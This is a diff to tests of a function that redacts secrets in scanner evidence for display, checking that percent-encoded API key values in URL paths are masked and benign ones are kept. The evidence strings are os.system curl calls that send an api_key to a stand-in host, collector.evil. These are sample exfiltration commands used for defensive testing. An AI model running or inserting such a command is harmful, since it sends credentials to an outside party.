@@ -1798,16 +1798,17 @@ def test_catboost_display_preserves_benign_split_base64_literals() -> None:
 
 
 def test_catboost_display_redacts_percent_encoded_url_path_secret() -> None:
-    evidence = 'os.system("curl https://collector.evil/upload/api_key%253Dhunter12")'
+    evidence = 'os.system("curl https://collector.evil/upload/api_key%253Dabc%252Fdef/visible")'
 
     redacted = _redact_evidence_for_display(evidence, max_chars=500)
 
-    assert "hunter12" not in redacted
+    assert "abc" not in redacted
+    assert "def" not in redacted
     assert "https://collector.evil/upload/api_key=<redacted>" in redacted
 
 
 def test_catboost_display_preserves_benign_percent_encoded_url_path() -> None:
-    evidence = 'os.system("curl https://collector.evil/upload/tokenizer%3Dbert-base")'
+    evidence = 'os.system("curl https://collector.evil/upload/tokenizer%3Dorg%252Fbert-base")'
 
     assert _redact_evidence_for_display(evidence, max_chars=500) == evidence
 
